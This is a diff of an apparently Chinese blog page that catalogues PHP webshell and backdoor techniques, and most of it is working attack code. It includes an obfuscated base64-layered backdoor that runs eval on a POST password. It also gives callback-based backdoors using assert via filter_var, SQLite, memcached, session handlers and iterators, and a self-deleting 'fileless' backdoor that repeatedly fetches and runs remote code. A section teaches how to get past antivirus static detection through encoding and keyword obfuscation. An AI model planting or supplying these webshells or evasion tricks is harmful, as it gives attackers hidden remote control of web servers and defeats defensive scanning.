V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01UQXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qTXlLU2twT3c9PScpKTs&#x3D;lErzbn3Vk5O2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01USXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qazJLU2twT3c9PScpKTs&#x3D;U5zJkvgx0MBjZXZhbCgkbDFsbDExbGxsbGwxbGwxbCgnSkd4c01URnNiR3hzYkd3eGJHeHNiR3dvSkd4c01URnNiR3d4TVd4c2JHd3hNV3dzTVRncE8yVjJZV3dvSkd3eGJHd3hNV3hzYkd4c01XeHNNV3dvSkd4c01URnNiR3hzYkd3eGJHeHNiR3dvSkd4c01URnNiR3d4TVd4c2JHd3hNV3dzTVRNNE9Da3BLVHNrYkd4c2JHeHNNV3d4TVd4c2JHeHNiQ2drYkd3eE1XeHNiREV4Ykd4c2JERXhiQ2s3JykpOw&#x3D;&#x3D;Orb94oK1BBaoF8cySgaWYoJF9QT1NUWydteXB3ZCddKXsNCglyZXF1aXJlX29uY2UoZGlybmFtZShfX0ZJTEVfXykuIi8uLi8uLi9pbmMvcXEuYXBpLnBocCIpOw0KCUBldmFsKHFxbWQ1KCJVVjlBR3g0ZlhrRVFSQWdlR2tGRkV4aENXVkVMRmdsVlFrd0ZWZ3dkQVZnY1JFZ1dFUlFSVVFzYVFsbEZFUnRmZTU1Yjc0YWU4OSIsJ0RFJywkX1BPU1RbJ215cHdkJ10pKTsNCn0NCg0KaWYoJGpvYj09ImdldCImJiRBcG93ZXJbdXBncmFkZV9vbF0pDQp7DQoNCgloYWNrX2FkbWluX3RwbCgnZ2V0Jyk7DQp9DQplbHNlaWYoJGFjdGlvbj09ImdldCImJiRBcG93ZXJbdXBncmFkZV9vbF0pDQp7DQoJJGZpbGV1cmw9Imh0dHA6Ly9kb3duLnFpYm9zb2Z0LmNvbS91cGdyYWRlLnppcCI7DQoJaWYoJGNvZGU9ZmlsZV9nZXRfY29udGVudHMoJGZpbGV1cmwpKQ0KCXsNCgkJd3JpdGVfZmlsZShST09UX1BBVEguImNhY2hlL3VwZ3JhZGUuemlwIiwkY29kZSk7DQoJfQ0KCWVsc2VpZigkY29kZT1maWxlKCRmaWxldXJsKSkNCgl7DQoJCXdyaXRlX2ZpbGUoUk9PVF9QQVRILiJjYWNoZS91cGdyYWRlLnppcCIsJGNvZGUpOw0KCX0NCgllbHNlaWYoY29weSgkZmlsZXVybCxST09UX1BBVEguImNhY2hlL3VwZ3JhZGUuemlwIikpDQoJew0KCX0NCgllbHNlaWYoJGNvZGU9c29ja09wZW5VcmwoJGZpbGV1cmwpKQ0KCXsNCgkJd3JpdGVfZmlsZShST09UX1BBVEguImNhY2hlL3VwZ3JhZGUuemlwIiwkY29kZSk7DQoJfQ0KDQoJcmVxdWlyZV9vbmNlKFJPT1RfUEFUSC4iaW5jL2NsYXNzLnoucGhwIik7DQoJJHogPSBuZXcgWmlwOw0KCW1ha2VwYXRoKFJPT1RfUEFUSC4iY2FjaGUvdXBncmFkZSIpOw0KCSR6LT5FeHRyYWN0KFJPT1RfUEFUSC4iY2FjaGUvdXBncmFkZS56aXAiLFJPT1RfUEFUSC4iY2FjaGUvdXBncmFkZSIpOw0KCXVubGluayhST09UX1BBVEguImNhY2hlL3VwZ3JhZGUuemlwIik7DQoJZWNobyAiPE1FVEEgSFRUUC1FUVVJVj1SRUZSRVNIIENPTlRFTlQ9JzA7VVJMPSR3ZWJkYlt3d3dfdXJsXS9jYWNoZS91cGdyYWRlL2luZGV4LnBocCc+IjsNCglleGl0Ow0KfQ&#x3D;&#x3D;Oz1aqN6Bs2Twgiat5H0qQeo5bgm84V1tvONOA<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="language-none"><code class="language-none">&lt;?php &#x2F;* Powered by www.qibosoft.com *&#x2F;$lll11l11l11l11l1&#x3D;__FILE__;eval(base64_decode(&#39;JGxsMTFsbGwxMWxsbGwxMWw9Zm9wZW4oJGxsbDExbDExbDExbDExbDEsJ3JiJyk7ZnJlYWQoJGxsMTFsbGwxMWxsbGwxMWwsMjE2MCk7JGxsMWxsbGwxMTExMTExMWw9ZXhwbG9kZSgiXHQiLGJhc2U2NF9kZWNvZGUoZnJlYWQoJGxsMTFsbGwxMWxsbGwxMWwsMjcyKSkpOw&#x3D;&#x3D;&#39;));$lll111111ll1l1ll&#x3D;$ll1llll11111111l[0];$l1ll11lllll1ll1l&#x3D;$lll111111ll1l1ll&#123;2&#125;.$lll111111ll1l1ll&#123;5&#125;.$lll111111ll1l1ll&#123;8&#125;.$lll111111ll1l1ll&#123;11&#125;.$lll111111ll1l1ll&#123;14&#125;.$lll111111ll1l1ll&#123;17&#125;.$lll111111ll1l1ll&#123;20&#125;.$lll111111ll1l1ll&#123;23&#125;.$lll111111ll1l1ll&#123;26&#125;.$lll111111ll1l1ll&#123;29&#125;.$lll111111ll1l1ll&#123;32&#125;.$lll111111ll1l1ll&#123;35&#125;.$lll111111ll1l1ll&#123;38&#125;;$l11llll111l1l11l&#x3D;$l1ll11lllll1ll1l($ll1llll11111111l[1]);$l1l11111ll1l1l1l&#x3D;$l1ll11lllll1ll1l($l11llll111l1l11l&#123;2&#125;.$l11llll111l1l11l&#123;5&#125;.$l11llll111l1l11l&#123;8&#125;.$l11llll111l1l11l&#123;11&#125;.$l11llll111l1l11l&#123;14&#125;.$l11llll111l1l11l&#123;17&#125;.$l11llll111l1l11l&#123;20&#125;.$l11llll111l1l11l&#123;23&#125;);$lll1ll11l11l1ll1&#x3D;$l1ll11lllll1ll1l($ll1llll11111111l[2]);$l111ll111lll1111&#x3D;$l1ll11lllll1ll1l($lll1ll11l11l1ll1&#123;2&#125;.$lll1ll11l11l1ll1&#123;5&#125;.$lll1ll11l11l1ll1&#123;8&#125;.$lll1ll11l11l1ll1&#123;11&#125;.$lll1ll11l11l1ll1&#123;14&#125;.$lll1ll11l11l1ll1&#123;17&#125;.$lll1ll11l11l1ll1&#123;20&#125;.$lll1ll11l11l1ll1&#123;23&#125;);$ll1lll1lll111111&#x3D;$l1ll11lllll1ll1l($ll1llll11111111l[3]);$ll11llllll1lllll&#x3D;$l1ll11lllll1ll1l($ll1lll1lll111111&#123;2&#125;.$ll1lll1lll111111&#123;5&#125;.$ll1lll1lll111111&#123;8&#125;.$ll1lll1lll111111&#123;11&#125;.$ll1lll1lll111111&#123;14&#125;.$ll1lll1lll111111&#123;17&#125;.$ll1lll1lll111111&#123;20&#125;.$ll1lll1lll111111&#123;23&#125;);$lll1ll11l1111l11&#x3D;$l1ll11lllll1ll1l($ll1llll11111111l[4]);$ll1111l11l11llll&#x3D;$l1ll11lllll1ll1l($lll1ll11l1111l11&#123;2&#125;.$lll1ll11l1111l11&#123;5&#125;.$lll1ll11l1111l11&#123;8&#125;.$lll1ll11l1111l11&#123;11&#125;.$lll1ll11l1111l11&#123;14&#125;.$lll1ll11l1111l11&#123;17&#125;.$lll1ll11l1111l11&#123;20&#125;.$lll1ll11l1111l11&#123;23&#125;);$llll11l1ll111l1l&#x3D;$l1ll11lllll1ll1l($ll1llll11111111l[5]);$llllll1l11llllll&#x3D;$l1ll11lllll1ll1l($llll11l1ll111l1l&#123;2&#125;.$llll11l1ll111l1l&#123;5&#125;.$llll11l1ll111l1l&#123;8&#125;.$llll11l1ll111l1l&#123;11&#125;.$llll11l1ll111l1l&#123;14&#125;.$llll11l1ll111l1l&#123;17&#125;.$llll11l1ll111l1l&#123;20&#125;.$llll11l1ll111l1l&#123;23&#125;);eval($l1ll11lllll1ll1l(&#39;JGxsMTFsbGxsbGwxbGxsbGwoJGxsMTFsbGwxMWxsbGwxMWwsMTcpO2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJGxsMTFsbGxsbGwxbGxsbGwoJGxsMTFsbGwxMWxsbGwxMWwsMjMyKSkpOw&#x3D;&#x3D;&#39;));return ;?&gt;dGFiMWVhYjlzY2RlYjg2dG00cXVfZWJkY2ZlanFjMnZvdHBkdndlCU5UWmFjM0p0ZVRnNWJXbDNZV0phYkhsWGNIazBkWE05CWVHNWFPV050WWpGa2NYTnNhbkZrWm1oSVkzaE5jbkU5CWRucGFNVEZ1YW1KS2NIUnNabUpaYm1wWFpIQlJkMjQ5CU9HSmpZV3N6YjJ0U2FXMTVjSE5rYkdWSWMyaEpaSFk5CVoydGFkR0Z0YzNZNVlubDNjbnBhTjNSWGNtczBNbXM54bSULjFL6pblYuIkpO2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qQXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qTXlLU2twT3c9PScpKTs&#x3D;AhDBms0qm82LqpqMrHT1O2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01UQXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qTXlLU2twT3c9PScpKTs&#x3D;tGLOYY5fUpO2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01UY3BPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qTXlLU2twT3c9PScpKTs&#x3D;JqjcRhp75i6Lf4MwjO2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qQXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qTXlLU2twT3c9PScpKTs&#x3D;yS0ttoM7R7SDkJpvuNKUO2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01USXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qTXlLU2twT3c9PScpKTs&#x3D;vMCvyQqBIgcoO2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01UY3BPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qTXlLU2twT3c9PScpKTs&#x3D;agQLu9pzZf25xZjXjO2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01UVXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qTXlLU2twT3c9PScpKTs&#x3D;WOmDsuNvUYJUFK3O2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qQXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qTXlLU2twT3c9PScpKTs&#x3D;hx7OShbiw40pgFI3OeYhO2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01UQXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qTXlLU2twT3c9PScpKTs&#x3D;lErzbn3Vk5O2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01USXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qazJLU2twT3c9PScpKTs&#x3D;U5zJkvgx0MBjZXZhbCgkbDFsbDExbGxsbGwxbGwxbCgnSkd4c01URnNiR3hzYkd3eGJHeHNiR3dvSkd4c01URnNiR3d4TVd4c2JHd3hNV3dzTVRncE8yVjJZV3dvSkd3eGJHd3hNV3hzYkd4c01XeHNNV3dvSkd4c01URnNiR3hzYkd3eGJHeHNiR3dvSkd4c01URnNiR3d4TVd4c2JHd3hNV3dzTVRNNE9Da3BLVHNrYkd4c2JHeHNNV3d4TVd4c2JHeHNiQ2drYkd3eE1XeHNiREV4Ykd4c2JERXhiQ2s3JykpOw&#x3D;&#x3D;Orb94oK1BBaoF8cySgaWYoJF9QT1NUWydteXB3ZCddKXsNCglyZXF1aXJlX29uY2UoZGlybmFtZShfX0ZJTEVfXykuIi8uLi8uLi9pbmMvcXEuYXBpLnBocCIpOw0KCUBldmFsKHFxbWQ1KCJVVjlBR3g0ZlhrRVFSQWdlR2tGRkV4aENXVkVMRmdsVlFrd0ZWZ3dkQVZnY1JFZ1dFUlFSVVFzYVFsbEZFUnRmZTU1Yjc0YWU4OSIsJ0RFJywkX1BPU1RbJ215cHdkJ10pKTsNCn0NCg0KaWYoJGpvYj09ImdldCImJiRBcG93ZXJbdXBncmFkZV9vbF0pDQp7DQoNCgloYWNrX2FkbWluX3RwbCgnZ2V0Jyk7DQp9DQplbHNlaWYoJGFjdGlvbj09ImdldCImJiRBcG93ZXJbdXBncmFkZV9vbF0pDQp7DQoJJGZpbGV1cmw9Imh0dHA6Ly9kb3duLnFpYm9zb2Z0LmNvbS91cGdyYWRlLnppcCI7DQoJaWYoJGNvZGU9ZmlsZV9nZXRfY29udGVudHMoJGZpbGV1cmwpKQ0KCXsNCgkJd3JpdGVfZmlsZShST09UX1BBVEguImNhY2hlL3VwZ3JhZGUuemlwIiwkY29kZSk7DQoJfQ0KCWVsc2VpZigkY29kZT1maWxlKCRmaWxldXJsKSkNCgl7DQoJCXdyaXRlX2ZpbGUoUk9PVF9QQVRILiJjYWNoZS91cGdyYWRlLnppcCIsJGNvZGUpOw0KCX0NCgllbHNlaWYoY29weSgkZmlsZXVybCxST09UX1BBVEguImNhY2hlL3VwZ3JhZGUuemlwIikpDQoJew0KCX0NCgllbHNlaWYoJGNvZGU9c29ja09wZW5VcmwoJGZpbGV1cmwpKQ0KCXsNCgkJd3JpdGVfZmlsZShST09UX1BBVEguImNhY2hlL3VwZ3JhZGUuemlwIiwkY29kZSk7DQoJfQ0KDQoJcmVxdWlyZV9vbmNlKFJPT1RfUEFUSC4iaW5jL2NsYXNzLnoucGhwIik7DQoJJHogPSBuZXcgWmlwOw0KCW1ha2VwYXRoKFJPT1RfUEFUSC4iY2FjaGUvdXBncmFkZSIpOw0KCSR6LT5FeHRyYWN0KFJPT1RfUEFUSC4iY2FjaGUvdXBncmFkZS56aXAiLFJPT1RfUEFUSC4iY2FjaGUvdXBncmFkZSIpOw0KCXVubGluayhST09UX1BBVEguImNhY2hlL3VwZ3JhZGUuemlwIik7DQoJZWNobyAiPE1FVEEgSFRUUC1FUVVJVj1SRUZSRVNIIENPTlRFTlQ9JzA7VVJMPSR3ZWJkYlt3d3dfdXJsXS9jYWNoZS91cGdyYWRlL2luZGV4LnBocCc+IjsNCglleGl0Ow0KfQ&#x3D;&#x3D;Oz1aqN6Bs2Twgiat5H0qQeo5bgm84V1tvONOA</code></pre>
 
-<h3 id="27-利用session-set-save-handler-callback"><a href="#27-利用session-set-save-handler-callback" class="headerlink" title="27. 利用session_set_save_handler callback"></a>27. 利用session_set_save_handler callback</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?php
+<h3 id="27-利用session-set-save-handler-callback"><a href="#27-利用session-set-save-handler-callback" class="headerlink" title="27. 利用session_set_save_handler callback"></a>27. 利用session_set_save_handler callback</h3><pre class="language-none"><code class="language-none">&lt;?php
     error_reporting(0); 
     $session &#x3D; chr(97) . chr(115) . chr(115) . chr(101) . chr(114) . chr(116); &#x2F;&#x2F;assert
     &#x2F;&#x2F; open第一个被调用，类似类的构造函数
@@ -1143,19 +1143,19 @@ http:&#x2F;&#x2F;localhost&#x2F;test&#x2F;test.php?dede&#x3D;assert<span aria-hi
     session_set_save_handler(&quot;open&quot;, &quot;close&quot;, $session, &quot;write&quot;, &quot;destroy&quot;, &quot;gc&quot;);
     @session_start(); &#x2F;&#x2F; 打开会话
     $cloud &#x3D; $_SESSION[&quot;d&quot;] &#x3D; &quot;c&quot;;  
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+?&gt;</code></pre>
 
 <h3 id="28-利用include、pack隐藏webshell"><a href="#28-利用include、pack隐藏webshell" class="headerlink" title="28. 利用include、pack隐藏webshell"></a>28. 利用include、pack隐藏webshell</h3><p>利用PHP的include可以引入外部代码的特性，实现WEBSHELL代码的隐藏</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+<pre class="language-none"><code class="language-none">&lt;?php
     echo bin2hex(&quot;&lt;?php echo hello; ?&gt;&quot;);
 ?&gt;
 
 &lt;?php 
     @include(pack(&quot;H*&quot;, &quot;3c3f706870206563686f2068656c6c6f3b203f3e&quot;));  
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+?&gt;</code></pre>
 
 <h3 id="29-临时文件-include"><a href="#29-临时文件-include" class="headerlink" title="29. 临时文件 + include"></a>29. 临时文件 + include</h3><p>通过将恶意代码写入临时磁盘文件，然后include进当前代码空间进行执行，运行之后删除临时文件；通过写磁盘文件进行一次”中转”，是因为php不允许直接include一段字符串，但是允许一个包含php代码的文件</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+<pre class="language-none"><code class="language-none">&lt;?php
 
     $cfg_ml&#x3D;&#39;PD9waHAgQGV2YWwoJF9QT1NUWydndWlnZSddKT8+&#39;;
     &#x2F;&#x2F;&lt;?php @eval($_POST[&#39;guige&#39;])?&gt;
@@ -1190,29 +1190,29 @@ http:&#x2F;&#x2F;localhost&#x2F;test&#x2F;test.php?dede&#x3D;assert<span aria-hi
     @include($f);
     @unlink($f);  
 
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+?&gt;</code></pre>
 
 <h3 id="30-利用filter-var-callback特性"><a href="#30-利用filter-var-callback特性" class="headerlink" title="30. 利用filter_var callback特性"></a>30. 利用filter_var callback特性</h3><p>利用filter_var，php里用这个函数来过滤数组，只要指定过滤方法为回调（FILTER_CALLBACK），且option为assert即可</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+<pre class="language-none"><code class="language-none">&lt;?php
     filter_var($_REQUEST[&#39;op&#39;], FILTER_CALLBACK, array(&#39;options&#39; &#x3D;&gt; &#39;assert&#39;));
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+?&gt;</code></pre>
 
 <h3 id="31-数据库回调后门"><a href="#31-数据库回调后门" class="headerlink" title="31. 数据库回调后门"></a>31. 数据库回调后门</h3><p>注册一个sqlite函数，使之与assert功能相同。当执行这个sql语句的时候，就等于执行了assert</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+<pre class="language-none"><code class="language-none">&lt;?php
   $e &#x3D; $_REQUEST[&#39;e&#39;];
   $db &#x3D; new PDO(&#39;sqlite:sqlite.db3&#39;);
   $db-&gt;sqliteCreateFunction(&#39;myfunc&#39;, $e, 1);
   $sth &#x3D; $db-&gt;prepare(&quot;SELECT myfunc(:exec)&quot;);
   $sth-&gt;execute(array(&#39;:exec&#39; &#x3D;&gt; $_REQUEST[&#39;pass&#39;]));
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+?&gt;</code></pre>
 
-<h3 id="32-利用php-memcached执行webshell"><a href="#32-利用php-memcached执行webshell" class="headerlink" title="32. 利用php_memcached执行webshell"></a>32. 利用php_memcached执行webshell</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?php
+<h3 id="32-利用php-memcached执行webshell"><a href="#32-利用php-memcached执行webshell" class="headerlink" title="32. 利用php_memcached执行webshell"></a>32. 利用php_memcached执行webshell</h3><pre class="language-none"><code class="language-none">&lt;?php
   $mem &#x3D; new Memcache();
   $re &#x3D; $mem-&gt;addServer(&#39;localhost&#39;, 11211, TRUE, 100, 0, -1, TRUE, create_function(&#39;$a,$b,$c,$d,$e&#39;, &#39;return assert($a);&#39;));
   $mem-&gt;connect($_REQUEST[&#39;op&#39;], 11211, 0);
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+?&gt;</code></pre>
 
-<h3 id="33-利用preg-replace-callback隐藏webshell"><a href="#33-利用preg-replace-callback隐藏webshell" class="headerlink" title="33. 利用preg_replace_callback隐藏webshell"></a>33. 利用preg_replace_callback隐藏webshell</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?php
+<h3 id="33-利用preg-replace-callback隐藏webshell"><a href="#33-利用preg-replace-callback隐藏webshell" class="headerlink" title="33. 利用preg_replace_callback隐藏webshell"></a>33. 利用preg_replace_callback隐藏webshell</h3><pre class="language-none"><code class="language-none">&lt;?php
   preg_replace_callback(&#39;&#x2F;.+&#x2F;i&#39;, create_function(&#39;$arr&#39;, &#39;return assert($arr[0]);&#39;),$_REQUEST[&#39;op&#39;]);
 ?&gt;
 
@@ -1220,17 +1220,17 @@ http:&#x2F;&#x2F;localhost&#x2F;test&#x2F;test.php?dede&#x3D;assert<span aria-hi
 
 &lt;?php
   mb_ereg_replace_callback(&#39;.+&#39;, create_function(&#39;$arr&#39;, &#39;return assert($arr[0]);&#39;),$_REQUEST[&#39;op&#39;]);
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+?&gt;</code></pre>
 
-<h3 id="34-利用CallbackFilterIterator部署回调后门"><a href="#34-利用CallbackFilterIterator部署回调后门" class="headerlink" title="34. 利用CallbackFilterIterator部署回调后门"></a>34. 利用CallbackFilterIterator部署回调后门</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?php
+<h3 id="34-利用CallbackFilterIterator部署回调后门"><a href="#34-利用CallbackFilterIterator部署回调后门" class="headerlink" title="34. 利用CallbackFilterIterator部署回调后门"></a>34. 利用CallbackFilterIterator部署回调后门</h3><pre class="language-none"><code class="language-none">&lt;?php
   $iterator &#x3D; new CallbackFilterIterator(new ArrayIterator(array($_REQUEST[&#39;op&#39;],)), create_function(&#39;$a&#39;, &#39;assert($a);&#39;));
   foreach ($iterator as $item) 
   &#123;
     echo $item;
   &#125;
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+?&gt;</code></pre>
 
-<h3 id="35-PHP无文件后门"><a href="#35-PHP无文件后门" class="headerlink" title="35. PHP无文件后门"></a>35. PHP无文件后门</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?php
+<h3 id="35-PHP无文件后门"><a href="#35-PHP无文件后门" class="headerlink" title="35. PHP无文件后门"></a>35. PHP无文件后门</h3><pre class="language-none"><code class="language-none">&lt;?php
 unlink($_SERVER[&#39;SCRIPT_FILENAME&#39;]);
 ignore_user_abort(true);
 set_time_limit(0);
@@ -1240,9 +1240,9 @@ while($code &#x3D; file_get_contents($remote_file))&#123;
   @eval($code);
   sleep(5);
 &#125;;
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+?&gt;</code></pre>
 
-<h2 id="0x05-绕过姿势"><a href="#0x05-绕过姿势" class="headerlink" title="0x05 绕过姿势"></a>0x05 绕过姿势</h2><h3 id="1-绕过静态检测"><a href="#1-绕过静态检测" class="headerlink" title="1. 绕过静态检测"></a>1. 绕过静态检测</h3><h4 id="a-字符串处理"><a href="#a-字符串处理" class="headerlink" title="a. 字符串处理"></a>a. 字符串处理</h4><pre class="line-numbers language-none"><code class="language-none">1) 字符串变形
+<h2 id="0x05-绕过姿势"><a href="#0x05-绕过姿势" class="headerlink" title="0x05 绕过姿势"></a>0x05 绕过姿势</h2><h3 id="1-绕过静态检测"><a href="#1-绕过静态检测" class="headerlink" title="1. 绕过静态检测"></a>1. 绕过静态检测</h3><h4 id="a-字符串处理"><a href="#a-字符串处理" class="headerlink" title="a. 字符串处理"></a>a. 字符串处理</h4><pre class="language-none"><code class="language-none">1) 字符串变形
 
 利用各种字符串处理函数将一些可能被杀软识别的关键字变形，绕过正则匹配
 
@@ -1302,9 +1302,9 @@ $b&#x3D;~urldecode(&#39;%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%C4&#39;); 
 
 &#x2F;&#x2F; 通过十六进制和八进制混用的方式代替base64_decode，常见的编码方式base64, chr, rot13, gzip, zlib等
 
-$v230c590&#x3D;&quot;x62x61163x65x36x34137144145x63x6f144145&quot;; @eval($v230c590(.....<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+$v230c590&#x3D;&quot;x62x61163x65x36x34137144145x63x6f144145&quot;; @eval($v230c590(.....</code></pre>
 
-<h4 id="b-关键词处理"><a href="#b-关键词处理" class="headerlink" title="b. 关键词处理"></a>b. 关键词处理</h4><pre class="line-numbers language-none"><code class="language-none">1）使用全局变量绕过$_POST检查
+<h4 id="b-关键词处理"><a href="#b-关键词处理" class="headerlink" title="b. 关键词处理"></a>b. 关键词处理</h4><pre class="language-none"><code class="language-none">1）使用全局变量绕过$_POST检查
 
     @eval($GLOBALS[&#39;_POST&#39;][&#39;pass&#39;]);
 
@@ -1314,10 +1314,10 @@ $v230c590&#x3D;&quot;x62x61163x65x36x34137144145x63x6f144145&quot;; @eval($v230c
 
 3）利用文件名
 
-    $&#123;&quot;function&quot;&#125;&#x3D;substr(__FILE__,-10,-4);; $&#123;&quot;command&quot;&#125;&#x3D;$_POST[cmd]; $function($command);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+    $&#123;&quot;function&quot;&#125;&#x3D;substr(__FILE__,-10,-4);; $&#123;&quot;command&quot;&#125;&#x3D;$_POST[cmd]; $function($command);</code></pre>
 
 <h4 id="c-数组利用"><a href="#c-数组利用" class="headerlink" title="c. 数组利用"></a>c. 数组利用</h4><p>将循环的变量事先进行定义，可以降低查杀率</p>
-<pre class="line-numbers language-none"><code class="language-none">1）通过定义数组，再交给 eval 等处理
+<pre class="language-none"><code class="language-none">1）通过定义数组，再交给 eval 等处理
 
